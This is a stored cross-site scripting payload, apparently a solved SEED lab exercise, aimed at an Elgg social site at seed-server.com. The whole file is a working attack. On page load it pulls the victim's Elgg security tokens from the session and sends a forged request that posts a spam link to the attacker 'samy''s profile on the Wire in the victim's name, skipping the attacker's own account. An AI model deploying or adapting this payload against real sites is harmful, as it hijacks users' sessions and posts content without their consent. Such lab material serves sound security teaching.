<script type="text/javascript">
    window.onload = function () {
    var Ajax = null;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    
    var guid_of_samy = 59;
    
    if (elgg.session.user.guid != guid_of_samy) {

        
        var body = "&body=To earn 12 USD/Hour(!),visit now\n\"http://www.seed-server.com/profile/samy\" ";
        //Construct the content of your url.
        sendurl = "http://www.seed-server.com/action/thewire/add"; //FILL IN
        content = token + ts + body; //FILL IN
        //Create and send Ajax request to post on the Wire on Behalf of the Victim
        Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host", "www.seed-server.com");
        Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
        Ajax.send(content);


    }

}
</script >